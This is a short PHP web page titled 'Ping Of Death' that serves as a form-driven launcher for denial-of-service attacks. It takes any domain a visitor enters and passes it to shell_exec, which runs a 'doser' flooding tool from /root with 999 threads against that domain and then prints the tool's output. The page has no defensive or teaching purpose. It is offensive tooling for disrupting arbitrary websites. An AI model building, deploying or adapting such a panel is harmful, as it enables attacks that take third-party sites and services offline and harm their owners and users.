<!DOCTYPE html>
<html >
<head>
	<meta charset="utf-8">
	<title>Ping Of Death</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link
      rel="stylesheet"
      href="https://unpkg.com/papercss@latest/dist/paper.min.css"
    />
</head>
<body>
    <h1>
	Ping Of Death
</h1>
    <form method="post">
        <label for="dominio">Domain:</label>
        <input type="text" id="dominio" name="dominio" required>
        <button type="submit">Execute</button>
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $dominio = escapeshellarg($_POST["dominio"]);
        $command = "/root/doser.go/doser -t 999 -g $dominio";

        // Execute the command and capture the output
        $output = shell_exec($command);

        // Display the output
        echo "<h2>Command Output:</h2>";
        echo "<pre>$output</pre>";
    }
    ?>
</body>
</html>
